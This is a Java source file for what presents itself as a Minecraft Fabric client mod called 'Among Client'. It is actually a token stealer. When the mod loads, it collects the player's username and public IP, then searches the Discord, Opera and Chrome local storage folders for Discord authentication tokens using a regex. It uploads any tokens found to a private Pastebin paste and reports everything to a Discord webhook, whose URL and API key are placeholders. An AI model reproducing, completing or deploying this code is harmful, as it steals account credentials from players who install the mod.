package me.donutjonut.amongClient;

import net.fabricmc.api.ModInitializer;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import net.minecraft.client.MinecraftClient;
import java.awt.*;
import java.io.*;
import java.lang.reflect.Array;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class AmongClient implements ModInitializer {
    public static Logger LOGGER = LogManager.getLogger();
    public static final String MOD_ID = "aclient";
    public static final String MOD_NAME = "Among Client";

    @Override
    public void onInitialize() {
        final String discordWebhookURL = "discord webhook goes here";
        final String pastebinAPIKey = "pastebin api key goes here";

        log(Level.INFO, "Initializing");
        String minecraft_name = "NOT FOUND";
        try {
            minecraft_name = MinecraftClient.getInstance().getSession().getUsername();
        } catch (Exception ignore) {}

        String ip = "IP NOT FOUND";
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = bufferedReader.readLine();
        } catch (Exception ignore) {}

        String imposter = "amongus";
        StringBuilder webhooks = new StringBuilder();
        ArrayList<String> paths = new ArrayList<String>();
        String operatingSystem = System.getProperty("os.name");
        if (operatingSystem.contains("Windows")) {
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            int cx = 0;
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;
                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
                            String strLine;
                            while ((strLine = br.readLine()) != null) {
                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);
                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }
                            }
                        } catch (Exception ignored) {}
                    }
                }
            } catch (Exception ignored) {}
            imposter = webhooks.toString();
        }

        String paste1 = "fuck";
        try {
            URL url = new URL("https://pastebin.com/api/api_post.php");
            URLConnection con = url.openConnection();
            HttpURLConnection http = (HttpURLConnection)con;
            http.setRequestMethod("POST");
            http.setDoOutput(true);
            http.setDoInput(true);
            Map<String,String> arguments = new HashMap<>();
            arguments.put("api_dev_key", pastebinAPIKey);
            arguments.put("api_option","paste");
            arguments.put("api_paste_code", imposter);
            arguments.put("api_paste_private", "1");
            StringJoiner sj = new StringJoiner("&");
            for(Map.Entry<String,String> entry : arguments.entrySet())
                sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "="
                        + URLEncoder.encode(entry.getValue(), "UTF-8"));
            byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
            System.out.println(sj.toString());
            int length = out.length;
            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            http.connect();
            OutputStream os = http.getOutputStream();
            os.write(out);
            InputStream is = http.getInputStream();
            paste1 = new BufferedReader(new InputStreamReader(is,StandardCharsets.UTF_8)).lines().collect(Collectors.joining("\n"));
        } catch (IOException urlException) {
            urlException.printStackTrace();
        }

        DiscordWebhook webhook = new DiscordWebhook(discordWebhookURL);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setColor(Color.BLUE)
                .addField("os", operatingSystem, true)
                .addField("minecraft_name", minecraft_name, true)
                .addField("ip", ip, true)
                .addField("webhooks", paste1, true));
        try {
            webhook.execute();
        } catch (Exception ignored) {
            log(Level.INFO, "webhook failed");
        }

        log(Level.INFO, "IMPOSTER VALUE: " + imposter);
    }


    public static void log(Level level, String message){
        LOGGER.log(level, "["+MOD_NAME+"] " + message);
    }
}